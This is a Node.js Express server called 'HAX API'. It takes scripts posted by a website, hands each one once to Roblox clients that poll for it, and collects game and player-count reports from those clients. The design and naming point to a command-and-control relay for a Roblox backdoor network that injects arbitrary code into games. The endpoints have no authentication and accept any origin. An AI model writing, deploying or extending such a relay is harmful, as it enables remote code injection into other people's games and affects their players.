const express = require('express');
const app = express();

// Enable CORS for all routes
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

// Parse JSON and text bodies with error handling
app.use(express.json({
    limit: '10mb',
    verify: (req, res, buf) => {
        try {
            JSON.parse(buf);
        } catch (e) {
            res.status(400).json({ error: 'Invalid JSON' });
            throw new Error('Invalid JSON');
        }
    }
}));

app.use(express.text({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

let latestScript = "";
let gamesData = [];
let globalPlayers = 0;

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('Error:', err.message);
    res.status(500).json({ error: 'Internal server error' });
});

// Debug endpoint
app.get('/api/test', (req, res) => {
    res.json({ 
        status: 'online', 
        games: gamesData.length,
        players: globalPlayers,
        timestamp: Date.now()
    });
});

// Website POSTs script here
app.post('/api/execute', (req, res) => {
    try {
        latestScript = req.body || "";
        console.log('Script received:', latestScript ? latestScript.substring(0, 50) + '...' : 'empty');
        res.send('Script stored');
    } catch (e) {
        console.error('Execute error:', e);
        res.status(500).send('Error storing script');
    }
});

// Roblox GETs script from here
app.get('/api/execute', (req, res) => {
    try {
        res.send(latestScript || "");
        latestScript = ""; // Clear after sending
    } catch (e) {
        console.error('Execute get error:', e);
        res.status(500).send('');
    }
});

// Roblox POSTs game data here
app.post('/api/games/update', (req, res) => {
    try {
        console.log('Raw request body type:', typeof req.body);
        
        let data;
        if (typeof req.body === 'string') {
            if (req.body.trim() === '') {
                data = { games: [], globalPlayers: 0 };
            } else {
                try {
                    data = JSON.parse(req.body);
                } catch (e) {
                    console.error('JSON parse error:', e);
                    data = { games: [], globalPlayers: 0 };
                }
            }
        } else if (req.body && typeof req.body === 'object') {
            data = req.body;
        } else {
            data = { games: [], globalPlayers: 0 };
        }
        
        gamesData = data.games || [];
        globalPlayers = data.globalPlayers || 0;
        
        console.log('Games updated:', gamesData.length, 'games,', globalPlayers, 'players');
        res.status(200).send('OK');
    } catch (e) {
        console.error('Error updating games:', e);
        res.status(200).send('OK'); // Still return OK to not break Roblox
    }
});

// Website GETs game data here
app.get('/api/games', (req, res) => {
    try {
        console.log('Games requested');
        res.json({
            total: gamesData.length,
            players: globalPlayers || 0,
            games: gamesData
        });
    } catch (e) {
        console.error('Error getting games:', e);
        res.json({ total: 0, players: 0, games: [] });
    }
});

// Health check
app.get('/', (req, res) => {
    res.send('HAX API Running - ' + new Date().toISOString());
});

// Handle 404
app.use((req, res) => {
    res.status(404).json({ error: 'Not found' });
});

// Handle uncaught exceptions
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
});

process.on('unhandledRejection', (err) => {
    console.error('Unhandled Rejection:', err);
});

const port = process.env.PORT || 3000;
const server = app.listen(port, () => {
    console.log(`HAX Server running on port ${port}`);
    console.log(`API URL: https://hax-api-xdi2.onrender.com`);
});

// Handle server errors
server.on('error', (err) => {
    console.error('Server error:', err);
});
